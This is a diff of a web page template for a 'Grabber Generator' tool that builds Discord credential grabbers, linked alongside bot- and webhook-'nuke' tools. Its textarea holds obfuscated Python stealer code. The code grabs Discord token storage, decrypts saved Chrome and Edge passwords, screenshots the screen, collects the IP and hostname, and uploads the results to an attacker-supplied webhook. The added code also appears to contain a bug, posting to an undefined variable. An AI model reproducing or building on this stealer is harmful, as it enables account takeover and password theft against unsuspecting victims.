@@ -5,62 +5,87 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord Annoyance Tools - GrabberGenerator</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
+    <link href="static/style.css" rel="stylesheet">
 </head>
-<body class="container-fluid">
-    <h1>Grabber Generator</h1>
-    {% if error %}
-    <p class="text-success">{{ error |safe }}</p>
-    {% elif success %}
-    <p class="text-danger">{{ success }}</p>
-    {% endif %}
-    作成したGrabberのexeは入力したWebhook URLに送信されます
-    <div class="row">
-        <div class="col-md-6">
-            <form method="post" class="mb-3" id="form" accept-charset="UTF-8">
-                <div class="mb-2">
-                    <label for="webhookUrl">WebHook URL</label>
-                    <input type="text" class="form-control" id="webhookUrl" name="webhookUrl" required>
-                </div>
-                <div class="mb-2">
-                    <label for="libraries">使用ライブラリリスト（カンマ区切り）</label>
-                    <input type="text" class="form-control" id="libraries" name="libraries" value="requests,pyautogui,pillow" required>
-                </div>
-                <div class="mb-2">
-                    <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
-                    <textarea class="form-control" id="script" name="script" rows="20">B='Pman.zip'
-import pyautogui as J,requests as D,zipfile as G,getpass as K,re,io,os as A
-from socket import gethostname as L
-def M(directory):
-    C=directory;zip=G.ZipFile(B,'a')
-    for D in A.listdir(C):
-        if D.endswith(('.log','.ldb')):
-            F=A.path.join(C,D)
-            zip.write(F)
+<body>
+    <div class="bg"></div>
+    <div class="container">
+        <header class="header">
+            <h1 class="title">Grabber Generator</h1>
+            <ul class="nav">
+                <li><a href="/botNuke">BotNuke</a></li>
+                <li><a href="/webhookNuke">WebhookNuke</a></li>
+                <li><a href="/grabberGenerator">GrabberGenerator</a></li>
+            </ul>
+        </header>
+        <div class="content">
+            {% if error %}
+            <p class="text-success">{{ error | safe }}</p>
+            {% elif success %}
+            <p class="text-danger">{{ success }}</p>
+            {% endif %}
+            <p>作成したGrabberのexeは入力したWebhook URLに送信されます</p>
+            <div class="row">
+                <div class="col-md-6">
+                    <form method="post" class="mb-3" id="form" accept-charset="UTF-8">
+                        <div class="mb-2">
+                            <label for="webhookUrl">WebHook URL</label>
+                            <input type="text" class="form-control" id="webhookUrl" name="webhookUrl" required>
+                        </div>
+                        <div class="mb-2">
+                            <label for="libraries">使用ライブラリリスト（カンマ区切り）</label>
+                            <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow" required>
+                        </div>
+                        <div class="mb-2">
+                            <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
+                            <textarea class="form-control" id="script" name="script" rows="20">I='loginData'
+H='utf-8'
+G='discordData.zip'
+D=open
+import win32crypt as S,requests as E,zipfile as J,getpass as P,sqlite3 as T,shutil as U,socket as Q,base64 as V,json,mss,os as A
+from Crypto.Cipher import AES
+B=A.getenv('LOCALAPPDATA')
+K=A.getenv('APPDATA')
+W=[f"{B}\\Google\\Chrome",f"{B}\\Microsoft\\Edge"]
+L=''
+def R():
+    B=A.path.join(K,'discord','Local Storage','leveldb')
+    if not A.path.exists(B):return
+    for C in A.listdir(B):
+        if C.endswith(('.log','.ldb')):
+            with J.ZipFile(G,'w')as D:D.write(A.path.join(B,C))
+def X():
+    G=None;C='===== Find Chromium Datas =====\n'
+    for dir in W:
+        J=f"{dir}\\User Data\\Local State"
+        if not A.path.exists(J):return
+        C+='===== '+dir.split('\\')[-1]+' =====\n'
+        with D(J,encoding=H)as X:K=json.load(X)
+        L=K['profile']['info_cache'];B=K['os_crypt']['encrypted_key'];B=B.encode(H);B=V.b64decode(B)[5:];Y=S.CryptUnprotectData(B,G,G,G,0)[1]
+        for F in L:
+            M=L[F];C+=F+':\n    Email:'+M['user_name']+'\n    Name:'+M['gaia_name']+'\n    LoginData:\n';Z=f"{dir}\\User Data\\{F}\\Login Data";U.copy2(Z,I);N=T.connect(I);O=N.cursor();O.execute('SELECT action_url, username_value, password_value FROM logins')
+            for(d,E)in enumerate(O.fetchall()):
+                P=E[0];Q=E[1];a=E[2][3:15];b=E[2][15:-16];c=AES.new(Y,AES.MODE_GCM,a);R=c.decrypt(b).decode()
+                if P and Q and R:C+=f"\n        ServiceUrl:{P}\n        Username:{Q}\n        Password:{R}\n"
+            N.close()
+    return C
 def C():
-    H='file';print('Start..');N=D.get('https://ifconfig.me').text;O=K.getuser();P=L();Q=J.screenshot();F=A.getenv('APPDATA')
-    if F:
-        G=A.path.join(F,'Discord','Local Storage','leveldb')
-        if A.path.exists(G):M(G)
-    R=f"""# Pman Grabber
-```
-IP:{N}
-
-User:{O}
-
-HostName:{P}
-```
-"""
-    with io.BytesIO()as C:
-        Q.save(C,format='PNG');C.seek(0)
-        with open(B,'rb')as S:T=S.read()
-        D.post(WEBHOOK_URL,data={'content':R},files={H:('screenShot.png',C,'image/png'),H:(B,T)});A.remove(B)
+    N='rb';M='screenshot.png';L='resultLoginData.txt';C='file';print('Start....');S=X()
+    with D(L,encoding=H,mode='w')as T:T.write(S)
+    R();U=E.get('https://ifconfig.me').text;V=P.getuser();W=Q.gethostname();Y={'left':0,'top':0,'width':1920,'height':1080}
+    with mss.mss()as Z:B=Z.grab(Y);mss.tools.to_png(B.rgb,B.size,output=M)
+    B=D(M,N);J=D(G,N);K=D(L,N);O={C:B,C:J,C:K};E.post(WEBHOOK_URL,data={'content':f"# Grabber Result\n```\nIP:{U}\nUseUser:{V}\nHostName:{W}```"},files={C:B});E.post(F,files={C:J});E.post(F,files={C:K});B.close();J.close();K.close();O=[G,I,M,L]
+    for a in O:A.remove(a)
 if __name__=='__main__':C()</textarea>
+                        </div>
+                        <button type="submit" id="submit" class="btn btn-primary">
+                            <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+                            作成
+                        </button>
+                    </form>
                 </div>
-                <button type="submit" id="submit" class="btn btn-primary">
-                    <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
-                    作成
-                </button>
-            </form>
+            </div>
         </div>
     </div>
     <script>
